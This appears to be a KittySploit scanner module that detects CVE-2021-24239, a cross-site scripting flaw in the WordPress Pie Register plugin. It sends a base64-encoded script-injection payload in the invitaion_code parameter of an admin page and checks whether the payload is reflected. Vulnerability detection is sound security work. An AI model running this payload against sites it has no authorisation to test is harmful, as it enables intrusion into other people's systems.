#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Pie Register plugin before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Pie Register <3.7.0.1 - Cross-Site Scripting Detection',
        'description': 'WordPress Pie Register plugin before 3.7.0.1 is susceptible to cross-site scripting. The plugin does not sanitize the invitaion_code GET parameter when outputting it in the Activation Code page. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site, which can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'xss', 'pie-register', 'wp', 'wpscan', 'genetechsolutions', 'wordpress', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/f1b67f40-642f-451e-a67a-b7487918ee34',
            'https://plugins.trac.wordpress.org/changeset/2507536/',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24239',
        ],
        'cve': 'CVE-2021-24239',
    }

    def run(self):
        path = '/wp-content/plugins/pie-register/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Pie Register', 'Tags:',)
        if not (all(m in body for m in body_all)):
            return False
        path = '/wp-admin/admin.php?page=pr_new_registration_form&show_dash_widget=1&invitaion_code=PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOzwvc2NyaXB0Pg=='
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('<script>alert(document.domain);</script>', 'invitaion-code-table',)
        if any(m in body for m in body_any):
            self.set_info(severity='medium', reason='WordPress Pie Register <3.7.0.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

